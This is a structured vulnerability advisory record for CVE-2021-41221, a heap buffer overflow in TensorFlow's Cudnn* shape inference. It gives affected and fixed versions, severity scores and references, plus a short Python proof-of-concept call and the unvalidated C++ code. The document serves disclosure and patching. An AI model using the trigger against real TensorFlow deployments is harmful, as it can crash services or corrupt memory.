advisory_id: pypi/tensorflow/CVE-2021-41221
datasource_id: gitlab_importer_v2/pypi/tensorflow/CVE-2021-41221
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/tensorflow/CVE-2021-41221.yml
aliases:
  - CVE-2021-41221
  - GHSA-cqv6-3phm-hcwx
summary: |
  Access to invalid memory during shape inference in `Cudnn*` ops
  The [shape inference code](https://github.com/tensorflow/tensorflow/blob/9ff27787893f76d6971dcd1552eb5270d254f31b/tensorflow/core/ops/cudnn_rnn_ops.cc) for the `Cudnn*` operations in TensorFlow can be tricked into accessing invalid memory, via a heap buffer overflow:

  ```python
  import tensorflow as tf

  @tf.function
  def func():
  return tf.raw_ops.CudnnRNNV3(
  input=[0.1, 0.1],
  input_h=[0.5],
  input_c=[0.1, 0.1, 0.1],
  params=[0.5, 0.5],
  sequence_lengths=[-1, 0, 1])

  func()
  ```

  This occurs because the ranks of the `input`, `input_h` and `input_c` parameters are not validated, but code assumes they have certain values:

  ```cc
  auto input_shape = c->input(0);
  auto input_h_shape = c->input(1);
  auto seq_length = c->Dim(input_shape, 0);
  auto batch_size = c->Dim(input_shape, 1);  // assumes rank >= 2
  auto num_units = c->Dim(input_h_shape, 2); // assumes rank >= 3
  ```
impacted_packages:
  - purl: pkg:pypi/tensorflow
    affected_versions: vers:pypi/<2.4.4|>=2.5.0|<2.5.2|>=2.6.0|<2.6.1
    fixed_versions: vers:pypi/2.4.4|2.5.2|2.6.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv2
    scoring_elements: AV:L/AC:L/Au:N/C:P/I:P/A:P
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/tensorflow/CVE-2021-41221.yml
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/tensorflow/CVE-2021-41221.yml
weaknesses:
  - CWE-120
  - CWE-1035
  - CWE-937
  - CWE-787
references:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-630.yaml
    reference_type:
    reference_id:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-828.yaml
    reference_type:
    reference_id:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-413.yaml
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/commit/af5fcebb37c8b5d71c237f4e59c6477015c78ce6
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cqv6-3phm-hcwx
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-41221
    reference_type:
    reference_id: CVE-2021-41221
  - url: https://github.com/advisories/GHSA-cqv6-3phm-hcwx
    reference_type:
    reference_id: GHSA-cqv6-3phm-hcwx
